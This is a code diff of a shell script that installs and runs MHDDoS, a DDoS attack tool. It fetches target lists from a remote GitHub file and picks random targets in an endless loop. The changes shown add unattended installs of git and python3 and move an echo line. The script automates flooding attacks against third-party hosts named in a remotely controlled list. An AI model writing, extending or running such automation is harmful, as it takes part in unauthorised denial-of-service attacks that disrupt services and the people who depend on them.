@@ -13,7 +13,12 @@ num_of_targets=2
 
 # Install git if it doesn't installed already
 if [ ! -f /usr/bin/git ]; then
-   sudo apt install git
+   sudo apt install git -y
+fi
+
+# Install python3 if it doesn't installed already
+if [ ! -f /usr/bin/python3 ]; then
+   sudo apt install python3 -y
 fi
 
 #No output. Resolved some problems with pip on debian
@@ -27,12 +32,11 @@ cd MHDDoS
 pip install -r requirements.txt > /dev/null #(no output on screen)
 
 while true
-
+echo "#####################################"
 do
    # Get number of targets in MHDDoS_targets. First 5 strings ommited, those are reserved as comments.
    list_size=$(curl -s https://raw.githubusercontent.com/KarboDuck/karbo-wiki/master/MHDDoS_targets | cat | tail -n +6 | wc -l)
    
-   echo "#####################################"
    echo -e "\nNumber of targets in list: " $list_size "\n"
 
    # Create list with random numbers
